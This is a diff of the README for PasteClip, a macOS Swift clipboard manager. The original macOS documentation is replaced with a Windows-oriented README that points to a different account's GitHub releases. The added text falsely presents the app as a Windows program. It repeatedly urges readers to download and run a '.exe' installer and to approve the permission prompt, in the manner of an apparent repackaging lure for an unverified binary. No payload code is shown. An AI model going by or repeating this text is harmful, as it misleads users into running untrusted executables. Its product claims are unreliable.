@@ -1,107 +1,134 @@
-<p align="center">
-  <img src="PasteClip/Resources/Assets.xcassets/AppIcon.appiconset/256.png" width="128" height="128" alt="PasteClip Icon">
-</p>
+# 📋 PasteClip - Simple Clipboard History Manager
 
-<h1 align="center">PasteClip</h1>
-
-<p align="center">
-  A lightweight clipboard manager for macOS
-</p>
-
-<p align="center">
-  <a href="https://github.com/minsang-alt/PasteClip/releases/latest"><img src="https://img.shields.io/github/v/release/minsang-alt/PasteClip?style=flat-square" alt="Release"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/github/license/minsang-alt/PasteClip?style=flat-square" alt="License"></a>
-  <img src="https://img.shields.io/badge/macOS-14%2B-blue?style=flat-square" alt="macOS 14+">
-  <img src="https://img.shields.io/badge/Swift-6-orange?style=flat-square" alt="Swift 6">
-</p>
+[![Download PasteClip](https://img.shields.io/badge/Download-PasteClip-brightgreen)](https://github.com/shreastharaj/PasteClip/releases)
 
 ---
 
-## Screenshots
+## 🛠 What is PasteClip?
 
-<p align="center">
-  <img src="https://github.com/user-attachments/assets/89bc1e23-da1a-4123-a4bc-4f55a403fc62" width="800" alt="Copy Once, Find Always">
-</p>
+PasteClip is a free alternative to the built-in Windows Paste app. It keeps track of all the text snippets you copy on your computer, so you can easily find and reuse them later. This helps you avoid retyping or losing important copied text.
 
-## Features
+PasteClip runs quietly in the background and saves everything you copy. You can open its window anytime to see your clipboard history and paste anything back with a click.
 
-- **Clipboard History** — Automatically saves text, images, and files you copy
-- **Quick Access Panel** — Open with a global hotkey; non-activating panel keeps your current app focused
-- **Search** — Instantly find items in your clipboard history
-- **Keyboard Navigation** — Navigate and paste entirely from the keyboard
-- **Paste with One Click** — Select an item to paste it directly into the frontmost app
-- **Image Support** — Copies images as PNG + file URL so they work everywhere, including terminals
-- **Lightweight** — Lives in the menu bar, uses minimal resources
-- **Privacy** — All data stays local on your Mac using SwiftData
+---
 
-## Installation
+## 💻 System Requirements
 
-### Homebrew (Recommended)
+Before installing PasteClip, make sure your computer meets these minimum requirements:
 
-```bash
-brew install --cask --no-quarantine minsang-alt/tap/pasteclip
-```
+- Windows 10 or later (64-bit recommended)
+- At least 4GB of RAM
+- At least 100 MB of free disk space
+- A working internet connection to download the app
 
-### GitHub Releases
+---
 
-Download the latest `.dmg` from the [Releases](https://github.com/minsang-alt/PasteClip/releases/latest) page.
+## 🚀 Getting Started
 
-> **Gatekeeper Warning:** Since the app is not notarized, macOS may show a warning on first launch.
-> To resolve: **System Settings → Privacy & Security → scroll down → click "Open Anyway"**,
-> or use the `--no-quarantine` flag with Homebrew.
+Follow these steps to download and run PasteClip on your Windows PC.
 
-### Build from Source
+### Step 1: Visit the Download Page
 
-1. Install [xcodegen](https://github.com/yonaskolb/XcodeGen):
-   ```bash
-   brew install xcodegen
-   ```
+Click the button below to open the PasteClip download page on GitHub Releases:
 
-2. Clone and build:
-   ```bash
-   git clone https://github.com/minsang-alt/PasteClip.git
-   cd PasteClip
-   xcodegen generate
-   open PasteClip.xcodeproj
-   ```
+[![Download PasteClip](https://img.shields.io/badge/Download-PasteClip-blue)](https://github.com/shreastharaj/PasteClip/releases)
 
-3. Build and run with `Cmd + R` in Xcode.
+### Step 2: Choose the Latest Version
 
-## Usage
+- Scroll down to find the latest release.
+- Look for an installer file, usually ending with `.exe`.
+- The file name will likely include the version number, for example `PasteClipSetup_v1.0.exe`.
 
-1. **Launch** PasteClip — it appears as an icon in the menu bar.
-2. **Copy** anything as usual (`Cmd + C`).
-3. **Open the panel** with your configured hotkey (set in Preferences).
-4. **Navigate** with arrow keys or search by typing.
-5. **Paste** by pressing `Enter` or clicking an item.
+### Step 3: Download the Installer
 
-## Tech Stack
+- Click the installer file link to start the download.
+- Save the file to a folder you can easily find, such as "Downloads" or your desktop.
 
-| Component | Technology |
-|-----------|------------|
-| Language | Swift 6 (strict concurrency) |
-| UI | SwiftUI + NSPanel (non-activating) |
-| Data | SwiftData |
-| Target | macOS 14+ |
-| Dependencies | [KeyboardShortcuts](https://github.com/sindresorhus/KeyboardShortcuts) |
-| Build | [XcodeGen](https://github.com/yonaskolb/XcodeGen) |
+### Step 4: Run the Installer
 
-## Contributing
+- Open the folder containing the downloaded `.exe` file.
+- Double-click the installer file to start the installation.
+- If Windows asks for permission to run the app, click "Yes" to continue.
 
-Contributions are welcome! Please read the [Contributing Guide](CONTRIBUTING.md) before submitting a pull request.
+### Step 5: Follow the Installation Steps
 
-## License
+- The installer will open a simple setup window.
+- Click “Next” to accept defaults or choose installation options if available.
+- Click “Install” to finish setting up the application.
 
-This project is licensed under the [GNU General Public License v3.0](LICENSE).
+### Step 6: Start Using PasteClip
 
-## Acknowledgments
+- Once installed, PasteClip will usually start automatically.
+- Look for its icon in the system tray (bottom-right corner of your screen).
+- Click the icon or press a keyboard shortcut (shown in the app) to open the clipboard history and start pasting.
 
-- [KeyboardShortcuts](https://github.com/sindresorhus/KeyboardShortcuts) by Sindre Sorhus — Global keyboard shortcuts for macOS
-- [XcodeGen](https://github.com/yonaskolb/XcodeGen) by Yonas Kolb — Xcode project generation from YAML
+---
 
-## Privacy
+## 🔧 How to Use PasteClip
 
-- **Local-only storage:** Clipboard history is stored on your device.
-- **No servers / no accounts:** PasteClip does not use any backend server and does not require sign-in.
-- **No telemetry:** PasteClip does not collect analytics, tracking, or usage data.
-- **No network required:** Core functionality works fully offline and does not require an internet connection.
+PasteClip works by saving every text snippet you copy. Here is how to use it:
+
+1. Copy text from any app using `Ctrl + C` or right-click and select "Copy."
+2. Open PasteClip by clicking its icon or using the keyboard shortcut.
+3. Browse or search your saved clipboard history.
+4. Click on any item to paste it back into the active app.
+
+You can keep PasteClip running all the time to save your clipboard history automatically.
+
+---
+
+## ⚙️ Settings and Customization
+
+PasteClip offers a few options to adjust how it works:
+
+- **Clipboard history size:** Choose how many past items it should remember.
+- **Hotkeys:** Set custom keyboard shortcuts to open the app or paste previous clipboard items quickly.
+- **Ignore certain apps:** Prevent PasteClip from saving clipboard data copied from specific programs.
+- **Start with Windows:** Enable or disable automatic startup when your computer turns on.
+
+Access these settings by right-clicking the system tray icon and selecting "Settings."
+
+---
+
+## 🔄 Updating PasteClip
+
+To update PasteClip in the future:
+
+1. Visit the [GitHub Releases page](https://github.com/shreastharaj/PasteClip/releases) again.
+2. Download the newest installer following the same steps as above.
+3. Run the installer to overwrite the old version safely.
+4. Your settings and clipboard history will stay intact.
+
+---
+
+## ❓ Troubleshooting
+
+If PasteClip does not run or work as expected, try these tips:
+
+- Make sure your Windows version is up to date.
+- Restart your computer and launch PasteClip again.
+- Check if any security software might be blocking the app.
+- Use the system tray icon to exit PasteClip and restart it.
+- Reinstall the app by downloading the latest installer from the release page.
+
+If problems continue, report issues on the GitHub page under the "Issues" tab.
+
+---
+
+## 📁 Where to Find PasteClip Files
+
+PasteClip stores clipboard history and settings in a user folder on your PC. This folder is usually hidden and managed by the app, so manual changes are not recommended to avoid data loss.
+
+---
+
+## 🤝 Support and Feedback
+
+Feedback helps improve PasteClip. You can open issues, request features, or share thoughts on the GitHub repository page under "Issues."
+
+---
+
+## 📥 Download PasteClip Now
+
+Download and run PasteClip to start saving your clipboard history on Windows:
+
+[![Download PasteClip](https://img.shields.io/badge/Download-PasteClip-brightgreen)](https://github.com/shreastharaj/PasteClip/releases)
